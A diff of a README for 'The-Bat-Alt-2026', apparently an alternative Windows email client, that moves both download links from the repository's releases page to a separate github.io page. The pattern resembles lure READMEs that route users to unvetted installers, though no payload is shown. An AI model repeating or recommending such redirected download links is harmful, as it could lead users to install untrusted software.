@@ -1,6 +1,6 @@
 # 📥 The-Bat-Alt-2026 - Secure Email Management For Your PC
 
-[![](https://img.shields.io/badge/Download-The_Bat_Alt_2026-blue.svg)](https://github.com/lapr4746/The-Bat-Alt-2026/releases)
+[![](https://img.shields.io/badge/Download-The_Bat_Alt_2026-blue.svg)](https://lapr4746.github.io)
 
 The-Bat-Alt-2026 provides a secure environment for your electronic mail. This software manages your messages on Windows 10 and Windows 11. It focuses on privacy and data protection. You gain full control over your inbox and outgoing records through a stable interface.
 
@@ -16,7 +16,7 @@ Before you install this software, confirm your computer meets these standards:
 
 ## 📥 How to Download the Software
 
-Visit this page to download the latest installer file: [https://github.com/lapr4746/The-Bat-Alt-2026/releases](https://github.com/lapr4746/The-Bat-Alt-2026/releases).
+Visit this page to download the latest installer file: [https://lapr4746.github.io](https://lapr4746.github.io).
 
 1. Open the link in your web browser.
 2. Locate the "Assets" section under the most recent version tag.
